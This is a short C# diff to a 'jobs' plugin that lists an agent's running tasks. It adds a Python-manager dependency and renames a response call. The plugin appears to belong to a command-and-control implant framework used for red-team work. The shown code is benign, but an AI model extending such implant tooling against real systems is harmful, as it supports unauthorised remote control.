@@ -9,7 +9,7 @@ namespace Agent
         public string Name => "jobs";
         private IMessageManager messageManager { get; set; }
 
-        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner)
+        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner, IPythonManager pythonManager)
         {
             this.messageManager = messageManager;
         }
@@ -19,7 +19,7 @@ namespace Agent
             Dictionary<string, ServerJob> jobs = messageManager.GetJobs();
             Dictionary<string, string> jobsOut = jobs.ToDictionary(j => j.Value.task.id, j => j.Value.task.command);
 
-            await messageManager.AddResponse(new TaskResponse()
+            messageManager.AddTaskResponse(new TaskResponse()
             {
                 task_id = job.task.id,
                 user_output = JsonSerializer.Serialize(jobsOut),
